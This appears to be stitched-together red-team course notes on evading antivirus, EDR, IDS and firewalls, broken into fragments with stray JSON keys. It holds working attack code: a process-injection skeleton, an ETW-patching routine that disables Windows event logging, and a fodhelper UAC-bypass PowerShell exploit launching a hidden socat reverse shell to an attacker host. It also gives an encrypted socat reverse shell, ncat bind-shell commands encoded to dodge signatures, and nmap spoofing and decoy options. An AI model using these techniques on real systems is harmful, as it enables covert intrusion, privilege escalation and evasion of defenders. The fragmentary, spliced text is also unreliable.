    "c": "Static property-based signatures  Signatures can be attached to several file properties, including file hash, entropy, author, name, or other identifiable information to be used individually or in conjunction. These properties are often used in rule sets such as YARA or Sigma. Some properties may be easily manipulated, while others can be more difficult, specifically when dealing with pre-compiled closed-source applications. File Hashes  A file hash, also known as a checksum, is used to tag/identify a unique file. They are commonly used to verify a file’s authenticity or its known purpose (malicious or not). File hashes are generally arbitrary to modify and are changed due to any modification to the file. With access to the source for an application, any arbitrary section of the code can be modified and re-compiled to create a new hash. When dealing with a signed or closed-source application, bit-flipping can be used. Bit-flipping is a common cryptographic attack that will mutate a given application by flipping and testing each possible bit until it finds a viable bit. By flipping one viable bit, it will change the signature and hash of the application while maintaining all functionality. A python script to create a bit-flipped list by flipping each bit and creating a new mutated variant (~3000 - 200000 variants): import sys orig = list(open(sys.argv[1], \"rb\").read()) i = 0 while i < len(orig): current = list(orig) current[i] = chr(ord(current[i]) ^ 0xde) path = \"%d.exe\" % i output = \"\".join(str(e) for e in current) open(path, \"wb\").write(output) i += 1 print(\"done\") Then search for intact unique properties of the file. For example, when bit-flipping msbuild , use signtool to search for a file with useable certificate. This will guarantee that the functionality of the file is not broken, and the application will maintain its signed attribution. To leverage a script to loop through the bit-flipped list and verify functional variants: FOR /L %%A IN (1,1,10000) DO ( signtool verify /v /a flipped\\\\%%A.exe ) Entropy  Entropy can be defined as “the randomness of the data in a file used to determine whether a file contains hidden data or suspicious scripts.” EDRs and other scanners often leverage entropy to identify potential suspicious files or contribute to an overall malicious score. Entropy can be “too high” for obfuscated scripts, specifically when obscuring identifiable information such as variables or functions. Depending on the EDR employed, a “suspicious” entropy value is ~ greater than 6.8. To lower entropy, replace random identifiers with randomly selected English words. For example, change a variable from q234uf to nature . To prove the efficacy of changing identifiers, observe how the entropy changes using CyberChef .

    "c": "Next-Generation security  IDPS  The primary functions of IDPS solutions can be broken down into four main categories: Monitoring: IDPS monitors IT systems using either signature-based or anomaly-based intrusion detection to identify abnormal behavior and signature malicious activity. Alerts: After identifying potential threats, IDPS software will log and send out alert notifications to inform administrators of abnormal activity. Remediation: IDPS tools provide blocking mechanisms for malicious threats, giving administrators time to take action. In some cases, IT teams may not need to take action after an attack is blocked. Maintenance: Besides monitoring for abnormal behavior, IDPS tools can also monitor the performance of IT hardware and security components with health checks. This health monitoring ensures a security infrastructure is operating correctly at all times. NGNIPS  Next-Generation Network IPS (NGNIPS) have the following five characteristics according to Gartner (in 2013): Standard first-generation IPS capabilities: A next-generation network IPS can do what a traditional network IPS can do. Application awareness and full-stack visibility: Identify traffic from various applications and enforce network security policies. An NGNIPS must be able to understand up to the application layer. Context awareness: Use information from sources outside the IPS to aid in blocking decisions. Content awareness: Able to inspect and classify files, such as executable programs and documents, in inbound and outbound traffic. Agile engine: Support upgrade paths to benefit from new information feeds. NGIPS and NGFW are not the same and having both can be very useful. Challenges  Some challenges to keep an eye on when it comes to Next-Generation security: False positives: You will almost undoubtedly run into the problem of false-positive alerts, which can waste time and resources. Be vigilant when notified of potentially malicious behaviour, but also be aware that it is not a guarantee of an attack. Staffing: Cybersecurity is so essential to organisations that there is a shortage of available security professionals. Before implementing an IDPS system, ensure you’ve put together a team that has the capabilities to manage it effectively. Genuine risks: Beyond just managing an IDPS, there will be cases where administrator intervention is required. An IDPS can block many attacks but not all. Ensure teams keep their knowledge up-to-date on new types of attacks, so they’re not blindsided when one is identified. Ubiquity of data: The omnipresence of data, of all kinds, has necessitated the spread of organisational roles that manage, organise and safeguard this data. Reputations and compliance with regulations are at stake here. How much does non-compliance cost? And in case of a breach, dents in reputation?

For example, suppose we want to obfuscate the layout of our code but cannot modify the existing code. In that case, we can inject junk code. Concatenation can open the doors to several vectors to modify signatures or manipulate other aspects of an application. Attackers can also use it preemptively to break up all objects of a program and attempt to remove all signatures at once without hunting them down, commonly seen in obfuscators. Adversaries can leverage advanced logic and mathematics to create more complex and harder-to-understand code to combat analysis and reverse engineering. An analyst can attempt to understand a program’s function through its control flow; while problematic, logic and control flow is almost effortless to manipulate and make arbitrarily confusing. When dealing with control flow, an attacker aims to introduce enough obscure and arbitrary logic to confuse an analyst but not too much to raise further suspicion or potentially be detected by a platform as malicious. To craft arbitrary control flow patterns an attacker can leverage maths, logic, and/or other complex algorithms to inject a different control flow into a malicious function. Identifiable information can be one of the most critical components an analyst can use to dissect and attempt to understand a malicious program. By limiting the amount of identifiable information (variables, function names, etc.), an analyst has, the better chance an attacker has they won’t be able to reconstruct its original function.

    "c": "Protecting and stripping identifiable information  Consider three different types of identifiable data: object names, code structure, and file/compilation properties. Object names  Object names offer some of the most significant insight into a program’s functionality and can reveal the exact purpose of a function. An analyst can still deconstruct the purpose of a function from its behavior, but this is much harder if there is no context to the function. The importance of literal object names may change depending on if the language is compiled or interpreted. If an interpreted language such as Python or PowerShell is used, then all objects matter and must be modified. If a compiled language such as C, C# or C++ is used, only objects appearing in the strings are generally significant. An object may appear in the strings by any function that produces an IO operation. Example in C++  As example, a process injector written in C++ that reports its status to the command line: #include \"windows.h\" #include <iostream> #include <string> using namespace std; int main(int argc, char* argv[]) { unsigned char shellcode[] = \"\"; HANDLE processHandle; HANDLE remoteThread; PVOID remoteBuffer; string leaked = \"This was leaked in the strings\"; processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1]))); cout << \"Handle obtained for\" << processHandle; remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE); cout << \"Buffer Created\"; WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL); cout << \"Process written with buffer\" << remoteBuffer; remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL); CloseHandle(processHandle); cout << \"Closing handle\" << processHandle;

As a result, you might find it beneficial if you can: Create a huge amount of benign traffic that would simply overload the processing capacity of the IDS/IPS.

While there are other services in place like Event Logging and Trace Logging, these are either extensions of ETW or less prevalent to attackers. Component Purpose Controllers Build and configure sessions Providers Generate events Consumers Interpret events While less important to an attacker than components, event IDs are a core feature of Windows logging. Events are sent and transferred in XML format, the standard for how events are defined and implemented by providers. ETW has visibility over a majority of the operating system, whereas logging generally has limited visibility or detail. The best approach to taking down ETW is to limit its insight as much as possible into the operation while maintaining environment integrity. Approaches  With security best practices in place, it is typical for a modern environment to employ log forwarding. Log forwarding means that the SOC will move or “forward” logs from the host machine to a central server or indexer. Even if an attacker can delete logs from the host machine, they could already be off of the device and secured. Destroying all logs before they were forwarded can present serious suspicion and lead to an investigation. Even if an attacker did control what logs were removed and forwarded, defenders could still track the tampering. These IDs can monitor the process of destroying logs or “log smashing” and pose a clear risk to be detected. Event ID Purpose 1102 Logs when the Windows Security audit log was cleared 104 Logs when the log file was cleared 1100 Logs when the Windows Event Log service was shut down It is possible to bypass these mitigations further or tamper with the logs, but when approaching an environment, as a red team we do not know which security practices are in place, and it is better to take an OPSEC approach: Focus on what logs a malicious technique may result in to keep an environment’s integrity intact. Knowing what may be instrumented against an approach. Most published techniques will target ETW components since that will allow an attacker the most control over the tracing process.

It is always important to set the user-agent to something innocuous and test it to confirm your settings. Sleep Time: The sleep time allows you to control the callback interval between beacon check-ins. In other words, you can control how often the infected system will attempt to connect to the control system. Jitter: This variable lets you add some randomness to the sleep time, specified by the jitter percentage. A jitter of 30% results in a sleep time of ±30% to further evade detection. SSL Certificate: Using authentic-looking SSL certificates will significantly improve chances of evading detection. A worthy investment of time. DNS Beacon: Consider the case when you are using DNS protocol to exfiltrate data. You can fine-tune DNS beacons by setting the DNS servers and the hostname in the DNS query.

When running in memory most, but not all, portable executables make use of 2 structures: Import Address Table (IAT), has all calls to dll functions point to a jump in the process’s jump table, allowing targets to easily be found and changed by the PE loader. Base Relocation Table (Reloc), a table of pointers to every absolute address used in the code. During process initialization, if the process is not being loaded at its base address, the PE loader will modify all the absolute addresses to work with the new base address. The Import Address Table and Reloc Table remain in memory once the process initialization is finished, this makes for a very easy way to inject a process. With the ability to be loaded at any base address and use DLLs at any address, the process can simply get its current base address and image size from the PE header, and copy itself to any region of memory in almost any process. Here is the entire procedure broken down. Get the current images base address and size (from the PE header ). Allocate enough memory for the image inside the processes own address space ( VirtualAlloc ). Have the process copy its own image into the locally allocated memory (memcpy). Allocate memory large enough to fit the image in the target process ( VirtualAllocEx ). Calculate the offset of the reloc table for the image that was copied into the local memory. Iterate the reloc table of the local image and modify all absolute addresses to work at the address returned by VirtualAllocEx. Copy the local image into the memory region allocated in the target process ( WriteProcessMemory ). Calculate the remote address of the function to be executed in the remote process by subtracting the address of the function in the current process by the base address of the current process, then adding it to the address of the allocated memory in the target process.

In simple terms, this technique forwards the packets sent to one destination port to another destination port. For example, packets sent to port 80 on one system are forwarded to port 8080 on another system. Consider the following case: An SMTP server listening on port 25. It is not possible to connect to the SMTP server because the firewall blocks packets from the Internet sent to destination port 25. Packets sent to destination port 443 are not blocked, so we can send packets to port 443, and after they pass through the firewall, we forward them to port 25. Assume we can run a command of our choice on one of the systems behind the firewall. We can use that system to forward our packets to the SMTP server: ncat -lvnp 443 -c \"ncat TARGET_SERVER 25\" -lvnp 443 listens on TCP port 443 . Because the port number < 1024 , run ncat as root. -c or --sh-exec executes the given command via /bin/sh . ncat TARGET_SERVER 25 will connect to the target server at port 25 . As a result, ncat will listen on port 443 , but it will forward all packets to port 25 on the target server. In this case, the firewall is blocking port 25 and allowing port 443, port tunneling is an efficient way to evade the firewall. Lab  We have a web server listening on the HTTP port, 80 . The firewall is blocking traffic to port 80 from the untrusted network; and traffic to TCP port 8008 is not blocked. There is a vulnerable web-form to set up the ncat listener that forwards the packets received to the forwarded port. Using port tunneling, browse to the web server and retrieve the flag. Set up a port forwarding from port 80 to 8008 on the webserver from the vulnerable form hosted on port 8080 using the vulnerable form: ncat -lvnp 8008 -c \"ncat localhost 80\" On the attacker machine, try to connect netcat to the server with the non-filtered port in the firewall 8008 and request the website with a GET / HTTP request : # nc TARGET_IP 8008 Flag!",

Within a new process, ETW events are sent from userland and issued directly from the current process. An attacker can write pre-defined opcodes to an in-memory function of ETW to patch and disable functionality. ETW is written from the function EtwEventWrite . The disassembly of that function: 779f2459 33cc xor ecx, esp 779f245b e8501a0100 call ntdll!_security_check_cookie 779f2460 8be5 mov esp, ebp 779f2462 5d pop ebp 779f2463 c21400 ret 14h ret 14h will end the function and returns control to the calling application. At a high level, ETW patching can be broken up into five steps: Obtain a handle for EtwEventWrite Modify memory permissions of the function Write opcode bytes to memory Reset memory permissions of the function (optional) Flush the instruction cache (optional) Code  EtwEventWrite is stored within ntdll . Load the library and obtain the handle using GetProcAddress : var ntdll = Win32.LoadLibrary(\"ntdll.dll\"); var etwFunction = Win32.GetProcAddress(ntdll, \"EtwEventWrite\"); The permission of the function is defined by the flNewProtect parameter; 0x40 enables X , R , or RW access: uint oldProtect; Win32.VirtualProtect( etwFunction, (UIntPtr)patch.Length, 0x40, out oldProtect ); Now the function has the permissions required to write to it, and the pre-defined opcode to patch it is known. Because of writing to a function and not a process, Marshal.Copy can be used to write the opcode. patch(new byte[] { 0xc2, 0x14, 0x00 }); Marshal.Copy( patch, 0, etwEventSend, patch.Length ); Clean to restore memory permissions as they were: VirtualProtect(etwFunction, 4, oldProtect, &oldOldProtect); Make sure the patched function will be executed from the instruction cache: Win32.FlushInstructionCache( etwFunction, NULL ); Compile these steps together and append them to a malicious script or session.

This applies to most of the Control Panel’s functionality and some executables provided with Windows. mmc.exe will auto elevate depending on the .msc snap-in that the user requests. Most of the .msc files included with Windows will auto elevate. Windows keeps an additional list of executables that auto elevate even when not requested in the manifest. This list includes pkgmgr.exe and spinstall.exe . COM objects can also request auto-elevation by configuring some registry keys . For an application, to auto-elevate: The executable must be signed by the Windows Publisher. The executable must be contained in a trusted directory, like %SystemRoot%/System32/ or %ProgramFiles%/ . Depending on the type of application, additional requirements may apply: Executable files must declare the autoElevate element inside their manifests.

Like most of the programs used for system configuration, fodhelper can auto elevate when using default UAC settings so that administrators won’t be prompted for elevation when performing standard administrative tasks. fodhelper can be abused without having access to a GUI. It can be used through a medium integrity remote shell and leveraged into a fully functional high integrity process. This particular technique was discovered by winscripting and has been used in the wild by the Glupteba malware. When Windows opens a file, it checks the registry to know what application to use. The registry holds a key known as Programmatic ID ( ProgID ) for each filetype, where the corresponding application is associated. When for example, trying to open an HTML file, a part of the registry known as the HKEY_CLASSES_ROOT will be checked so that the system knows that it must use your preferred web client to open it. The command to use will be specified under the shell/open/command subkey for each file’s ProgID . In reality, HKEY_CLASSES_ROOT is just a merged view of two different paths on the registry: Path Description HKEY_LOCAL_MACHINE\\Software\\Classes System-wide file associations HKEY_CURRENT_USER\\Software\\Classes Active user's file associations When checking HKEY_CLASSES_ROOT , if there is a user-specific association at HKEY_CURRENT_USER ( HKCU ), it will take priority. If no user-specific association is configured, then the system-wide association at HKEY_LOCAL_MACHINE ( HKLM ) will be used instead. This way, each user can choose their preferred applications separately if desired. fodhelper searches the registry for a specific key of interest under the ms-settings ProgID . By creating an association for that ProgID in the current user’s context under HKCU , we will override the default system-wide association and, therefore, control which command is used to open the file. Since fodhelper is an autoElevate executable, any subprocess it spawns will inherit a high integrity token, effectively bypassing UAC . Lab  Note: Defender is disabled.

But if UAC is configured on the “Always Notify” level, fodhelper and similar apps won’t be of any use as they will require the user to go through the UAC prompt to elevate. This prevents several known bypass methods. Scheduled tasks are an exciting target. By design, they are meant to be run without any user interaction (independent of the UAC security level), so asking the user to elevate a process manually is not an option. Any scheduled tasks that require elevation will automatically get it without going through a UAC prompt. The Disk Cleanup Scheduled Task is configured to run with the Users account, which means it will inherit the privileges from the calling user. The Run with highest privileges option will use the highest privilege security token available to the calling user, which is a high IL token for an administrator. If a regular non-admin user invokes this task, it will execute with medium IL only since that is the highest privilege token available to non-admins, and a bypass would not work.

The way AMSI is instrumented can be complex, including multiple DLLs and varying execution strategies depending on where it is instrumented.

How data is dissected as it flows through the layers and what DLLs/API calls are being instrumented. Break down into core components.

Most of the known bypasses are placed in the Win32 API layer, manipulating the AmsiScanBuffer API call. To find where AMSI is instrumented, use InsecurePowerShell, a GitHub fork of PowerShell with security features removed. Look through the compared commits and observe any security features.

Obfuscating and encoding the payload  Because IDS rules are very specific, minor changes to avoid detection can work. The changes include adding extra bytes, obfuscating the attack data, and encrypting the communication. Consider the command ncat -lvnp 1234 -e /bin/bash , where ncat will listen on TCP port 1234 and connect any incoming connection to the Bash shell. There are a few common transformations such as Base64, URL encoding, and Unicode escape sequence that can be applied to the command to avoid triggering IDS/IPS signatures. Encode to a Base64 format: $ cat input.txt ncat -lvnp 1234 -e /bin/bash $ base64 input.txt bmNhdCAtbHZucCAxMjM0IC1lIC9iaW4vYmFzaA== URL encoding: $ urlencode ncat -lvnp 1234 -e /bin/bash ncat%20-lvnp%201234%20-e%20%2Fbin%2Fbash Escaped Unicode  Some applications will still process input and execute it properly if escaped Unicode is used. There are multiple ways to use escaped Unicode depending on the system processing the input string. For example, CyberChef can be used to select and configure the Escape Unicode Characters. Search for Escape Unicode Characters Drag it to the Recipe column Check-mark Encode all chars with a prefix of \\u Make sure there is a check-mark near Uppercase hex with a padding of 4 Clearly a drastic transformation that would help evade detection, assuming the target system will interpret it correctly and execute it. Using the format \\uXXXX , ncat -lvnp 1234 -e /bin/bash becomes: \\u006e\\u0063\\u0061\\u0074\\u0020\\u002d\\u006c\\u0076\\u006e\\u0070\\u0020\\u0031\\u0032\\u0033\\u0034\\u0020\\u002d\\u0065\\u0020\\u002f\\u0062\\u0069\\u006e\\u002f\\u0062\\u0061\\u0073\\u0068 Encrypting the communication channel  Because an IDS/IPS will not inspect encrypted data, an attacker can take advantage of encryption to evade detection. Unlike encoding, encryption requires an encryption key and decrypting on the other side. One direct approach is to create the necessary encryption key on the attacker’s system and set socat to use the encryption key to enforce encryption as it listens for incoming connections. An encrypted reverse shell can be carried out in three steps: Create the key Listen on the attacker’s machine Connect to the attacker’s machine Create key using openssl : $ openssl req -x509 -newkey rsa:4096 -days 365 -subj '/CN=www.redteam.thm/O=Red Team THM/C=UK' -nodes -keyout thm-reverse.key -out thm-reverse.crt $ ls thm-reverse.crt thm-reverse.key req indicates that this is a certificate signing request (not submitting it for signing). -x509 specifies an X.509 certificate -newkey rsa:4096 creates a new certificate request and a new private key using RSA, with the key size being 4096 bits. -days validity in days -subj sets data, such as organization and country, via the command-line. -nodes simplifies the command and does not encrypt the private key -keyout PRIVATE_KEY specifies the filename to save the private key to -out CERTIFICATE specifies the filename to which to write the certificate request The command returns a private key thm-reverse.key and a certificate thm-reverse.crt . The Privacy Enhanced Mail (PEM) .pem file requires the concatenation of the private key .key and the certificate .crt files: cat thm-reverse.key thm-reverse.crt > thm-reverse.pem With the PEM file ready, start listening while using the key for encrypting the communication with the client: socat -d -d OPENSSL-LISTEN:4443,cert=thm-reverse.pem,verify=0,fork STDOUT On the target system, connect back: socat OPENSSL:10.20.30.1:4443,verify=0 EXEC:/bin/bash Modifying the shellcode  Consider the simple case of using Ncat to create a bind shell. The command ncat -lvnp 1234 -e /bin/bash tells ncat to listen on TCP port 1234 and bind Bash shell to it. To detect packets containing such commands, think of something specific to match the signature but not too specific. So will attackers: Scanning for ncat -lvnp can be easily evaded by changing the order of the flags. On the other hand, inspecting the payload for ncat - can be evaded by adding an extra white space, such as ncat - which would still run correctly on the target system. If the IDS is looking for ncat , then simple changes to the original command are unlikely to evade detection. Consider more sophisticated approaches depending on the target system/application. One option would be to use a different command such as nc or socat. Alternatively, consider a different encoding if the target system can process it properly.

    "c": "Evasion via protocol manipulation  Evasion via protocol manipulation includes: Relying on a different protocol Manipulating (Source) TCP/UDP port Using session splicing (IP packet fragmentation) Sending invalid packets Rely on a different protocol  The IDS/IPS system might be configured to block certain protocols and allow others. For example, using UDP instead of TCP or relying on HTTP instead of DNS to deliver an attack or exfiltrate data. It depends on the target and the applications necessary for the target organization to design the attack. For example, if web browsing is allowed, it usually means that protected hosts can connect to ports 80 and 443 unless a local proxy is used. A client relying on Google services for their business, can be attacked using Google web hosting to conceal a malicious site. Not a one-size-fits-all, and some trial and error might be necessary (do not create too much noise). In case of an IPS set to block DNS queries and HTTP requests, enforcing a policy where local machines cannot query external DNS servers but instead query the local DNS server; moreover, and enforcing secure HTTP communications while being relatively permissive when it comes to HTTPS, using HTTPS to tunnel traffic looks like a promising approach to evade the IPS. Ncat  Ncat by default, uses a TCP connection, and can be set to use UDP using the option -u To listen using UDP (where port number is the listen port): ncat -ulvnp PORT_NUM To connect to an Ncat instance listening on a UDP port: nc -u TARGET_IP PORT_NUM Running ncat -lvnp 25 on the attacker system and connecting to it will give the impression that it is a usual TCP connection with an SMTP server, unless the IDS/IPS provides deep packet inspection (DPI) . Executing ncat -ulvnp 162 on the attacker machine and connecting to it will give the illusion that it is a regular UDP communication with an SNMP server unless the IDS/IPS supports DPI . Manipulate (Source) TCP/UDP port  The TCP and UDP source and destination ports are inspected even by the most basic security solutions. Without deep packet inspection , the port numbers are the primary indicator of the service used: network traffic involving TCP port 22 would be interpreted as SSH traffic unless the security solution can analyse the data carried by the TCP segments. Nmap  Add the option -g PORT_NUMBER (or --source-port PORT_NUMBER ) to make Nmap send all its traffic from a specific source port number. For example, use nmap -sS -Pn -g 80 -F MACHINE_IP to make the port scanning traffic appear to be exchanged with an HTTP server at first glance. When scanning UDP ports, use nmap -sU -Pn -g 53 -F MACHINE_IP to make the traffic appear to be exchanged with a DNS server. Ncat  Trying to camouflage the traffic as if it is DNS traffic: On the attacker machine, to use Ncat to listen on UDP port 53 (as a DNS server would), use ncat -ulvnp 53 . On the target, connect back to the listening server using ncat -u ATTACKER_IP 53 . To make it appear more like web traffic where clients communicate with an HTTP server: On the attacker machine, to get Ncat to listen on TCP port 80, like a benign web server, you can use ncat -lvnp 80 . On the target, connect to the listening server using nc ATTACKER_IP 80 . Use session splicing (IP packet fragmentation)  Another approach possible in IPv4 is IP packet fragmentation (session splicing). The assumption is that if you break the packet(s) related to an attack into smaller packets, you will avoid matching the IDS signatures. If the IDS is looking for a particular stream of bytes to detect the malicious payload, divide the payload among multiple packets. Unless the IDS reassembles the packets, the rule won’t be triggered. Nmap  Nmap offers a few options to fragment packets. Add: -f to set the data in the IP packet to 8 bytes. -ff to limit the data in the IP packet to 16 bytes at most. --mtu SIZE to provide a custom size for data carried within the IP packet. The size should be a multiple of 8. Suppose you want to force all your packets to be fragmented into specific sizes. In that case, consider using a program such as Fragroute . It can be set to read a set of rules from a given configuration file and applies them to incoming packets. For simple IP packet fragmentation, it would be enough to use a configuration file with ip_frag SIZE to fragment the IP data according to the provided size. The size must be a multiple of 8 . For example, you can create a configuration file fragroute.conf with one line, ip_frag 16 , to fragment packets where IP data fragments do not exceed 16 bytes. Then run the command fragroute -f fragroute.conf HOST . The HOST is the destination to which to send the fragmented packets to. Sending invalid packets  The response of systems to valid packets tends to be predictable. It can be unclear how systems will respond to invalid packets. For example, an IDS/IPS might process an invalid packet, while the target system might ignore it. The exact behaviour requires some experimentation or inside knowledge. Nmap makes it possible to create invalid packets in a many ways. Two common options are to scan the target using packets that have: Invalid TCP/UDP checksum Invalid TCP flags Nmap allows for sending packets with a wrong TCP/UDP checksum using the option --badsum . An incorrect checksum indicates that the original packet has been altered somewhere across its path from the sending program. Nmap also allows for sending packets with custom TCP flags, including invalid ones. The option --scanflags allows for setting flags: URG for Urgent ACK for Acknowledge PSH for Push RST for Reset SYN for Synchronize FIN for Finish To craft packets with custom fields (valid or invalid), consider a tool such as hping3 . A few example options: -t or --ttl to set the Time to Live in the IP header. -b or --badsum to send packets with a bad UDP/TCP checksum. -S , -A , -P , -U , -F , -R to set the TCP SYN , ACK , PUSH , URG , FIN , and RST flags, respectively.

This process lets Blue Teamers gain a better understanding of malicious programs, which can aid them in developing detections. There are two ways that a Blue Teamer can analyze a suspicious file One way is by Static Analysis, looking at the code on a micro-level (as previously stated) by using Disassemblers such as IDA or Ghidra. Another way is by Dynamic Analysis, observing what happens when a suspicious file is executed on the system. On the system, there are often many analysis tools installed, such as EDR Software, Sysmon, ProcMon, Process Hacker, and Debuggers (For example, OllyDebug, WinDbg, x64Dbg), and much more. One of the most creative and effective ways that Blue Teamers have come up with to analyse suspicious-looking files is in the category of Dynamic Analysis. This method involves running the file in a containerised (or virtualised) environment, referred to as a Sandbox. Depending on the sandbox of choice, it can be customised for what version of Windows is running, the software installed on the machine, etc. Sandboxes provide a safe and effective way to monitor what a suspicious-looking file does before running it on a production system (or allowing it to be sent to a production system). There are many commercial Sandboxes that may be in place in various parts of a network. Each sandbox may work differently; for example, a Firewall may execute the attachment in the email and see what kind of network communications occur, whereas a Mail sandbox may open the email and see if an embedded file within the email triggers a download over a protocol like SMB in an attempt to steal a NetNTLM hash, where a host-based Anti-Virus Sandbox may execute the file and monitor for malicious programmatic behavior or changes to the system. There are various vendors that make various Sandbox products that Blue Teamers may be able to deploy in a corporate network (just a few examples): Palo Alto Wildfire (Firewall) Proofpoint TAP (Email Sandbox) Falcon Sandbox (EDR/Workstation) MimeCast (Email Sandbox) VirusTotal (Sample Submission Site) Any.Run (Sample Submission Site) Antiscan.me (Sample Submission Site) Joe Sandbox (Sample Submission Site)",

    "c": "IDS/IPS systems  Intrusion detection  IDS setups can be divided based on their location in the network into: Host-based IDS (HIDS) Network-based IDS (NIDS) The host-based IDS (HIDS) is installed on an OS along with the other running applications. This setup will give the HIDS the ability to monitor the traffic going in and out of the host; moreover, it can monitor the processes running on the host. The network-based IDS (NIDS) is a dedicated appliance or server to monitor the network traffic. The NIDS should be connected so that it can monitor all the network traffic of the network or VLANs we want to protect. This can be achieved by connecting the NIDS to a monitor port on the switch. The NIDS will process the network traffic to detect malicious traffic. Snort as signature-based network IDS. Intrusion prevention  For Snort to function as an IPS, it needs some mechanism to block (drop) offending connections. This capability requires Snort to be set up as inline and to bridge two or more network cards. Snort as an IPS if set up inline. IDS Engine types  The detection engine of an IDS can be signature-based and/or anomaly-based. There are issues with both of these engines individually: A signature-based IDS requires full knowledge of malicious (or unwanted) traffic. In other words, it needs to explicitly be fed the characteristics of malicious traffic. Teaching the IDS about malicious traffic can be achieved using explicit rules to match against. Signature-based detection has low false positives but can only detect known attacks making them vulnerable to new, evolving attack methods. Anomaly-based IDS needs to have knowledge of what regular traffic looks like. In other words, it needs to be taught what normal is so that it can recognize what is not normal. Teaching the IDS about normal traffic (baseline traffic) can be achieved using machine learning or manual rules. Anomaly-based detection can lead to high numbers of false positives as it alerts all anomalous behaviour. But it has the potential to catch zero-day threats. Fortunately, many IDPS products combine both methodologies to complement their strengths and weaknesses.

A fileless malware means that the malware runs and is executed in the system without writing to disk. The malware performs all its functions from the victim device’s memory. Astaroth is known as an information stealer, which takes sensitive information from victim users, such as account credentials, keystrokes, and other data, and sends it to the attacker. The malware relies on various advanced techniques such as anti-debugging, anti-virtualization, anti-emulation tricks, process hollowing, NTFS Alternate Data Streams (ADS), and Living off the land binaries to perform different functions. In the initial access stage, attackers rely on a spam campaign that contains malicious attachment files. The attached file is an LNK file shortcut that, once the victim has clicked it, will result in the following: A WMIC command is executed to download and run Javascript code.

    "c": "Evasion via controlling the source MAC/IP/Port  When scanning a host behind a firewall, the firewall will usually detect and block port scans.

A network scanner like Nmap provides features to help with such a task: Evasion via controlling the source MAC/IP/Port Evasion via fragmentation, MTU, and data length Evasion through modifying header fields Nmap allows for hiding or spoofing the source with: Decoy(s) Proxy Spoofed MAC Address Spoofed Source IP Address Fixed Source Port Number Decoy(s)  Using decoys mixes the source IP address with other “decoy” IP addresses, making it difficult for the firewall and target host to know where the port scan is coming from. This can exhaust the blue team investigating each source IP address. To add decoy source IP addresses use the -D option to confuse the target: nmap -sS -Pn -D 10.10.10.1,10.10.10.2,ME -F MACHINE_IP To set Nmap to use random source IP addresses instead of explicitly specifying them: nmap -sS -Pn -D RND,RND,ME -F MACHINE_IP Proxy  Relaying the port scan via a proxy helps keep a source IP address unknown to the target host. This technique allows for keeping an IP address hidden while the target logs to the IP address of the proxy server. To send all packets via a specified proxy server: nmap -sS -Pn --proxies PROXY_URL -F MACHINE_IP Note that you can chain proxies using a comma-separated list. Spoofed MAC address  Nmap allows for spoofing MAC addresses using the option --spoof-mac MAC_ADDRESS . This technique is tricky; spoofing the MAC address works only if the attacking host is on the same network segment as the target host. The target system is going to reply to a spoofed MAC address. If not on the same network segment, sharing the same Ethernet, it would not be possible to capture and read the responses. It allows for exploiting any trust relationship based on MAC addresses. This technique can be used to hide scanning activities on the network. For example, by making scans appear as if coming from a network printer. Spoofed IP address  Nmap allows for spoofing IP addresses using -S IP_ADDRESS . Spoofing the IP address is useful if the attacking system is on the same subnetwork as the target host; otherwise, the replies sent back can not be read. Another use for spoofing IP address is when controlling the system that has that particular IP address. If noticing the target starts to block the spoofed IP address, switch to a different spoofed IP address that belongs to another controlled system. This scanning technique can help maintain a stealthy existence and with exploiting trust relationships on the network based on IP addresses. Fixed Source Port Number  Scanning from one particular source port number can be helpful when discovering the firewalls allows incoming packets from particular source port numbers, such as port 53 or 80. Without inspecting the packet contents, packets from source TCP port 80 or 443 look like packets from a web server, while packets from UDP port 53 look like responses to DNS queries.

A variation on the fodhelper exploit was proposed by V3ded , where different registry keys are used, but the basic principle is the same. Instead of writing the payload into HKCU\\Software\\Classes\\ms-settings\\Shell\\Open\\command , use the CurVer entry under a progID registry key. This entry is used when you have multiple instances of an application with different versions running on the same system. CurVer allows for pointing to the default version of the application to be used by Windows when opening a given file type. Create an entry on the registry for a new progID (any name will do) and then point the CurVer entry in the ms-settings progID to the newly created progID . This way, when fodhelper tries opening a file using the ms-settings progID , it will notice the CurVer entry pointing to the new progID and check it to see what command to use. The exploit code proposed by @V3ded uses Powershell to achieve this end. A modified version of it, adapted for using reverse shell: $program = \"powershell -windowstyle hidden C:\\tools\\socat\\socat.exe TCP:<attacker_ip>:4445 EXEC:cmd.exe,pipes\" New-Item \"HKCU:\\Software\\Classes\\.pwn\\Shell\\Open\\command\" -Force Set-ItemProperty \"HKCU:\\Software\\Classes\\.pwn\\Shell\\Open\\command\" -Name \"(default)\" -Value $program -Force New-Item -Path \"HKCU:\\Software\\Classes\\ms-settings\\CurVer\" -Force Set-ItemProperty \"HKCU:\\Software\\Classes\\ms-settings\\CurVer\" -Name \"(default)\" -value \".pwn\" -Force Start-Process \"C:\\Windows\\System32\\fodhelper.exe\" -WindowStyle Hidden This exploit creates a new progID with the name .pwn and associates the payload to the command used when opening such files and points the CurVer entry of ms-settings to the .pwn progID . When fodhelper tries opening an ms-settings program, it will instead be pointed to the .pwn progID and use its associated command. This technique is more likely to evade Windows Defender because we have more liberty on where to put the payload, as the name of the progID that holds our payload is entirely arbitrary. Lab  Start a new reverse shell on the attacker machine: nc -lvp 4445 And execute the exploit from the backdoor connection. Windows Defender will throw another fit that references the actions taken.

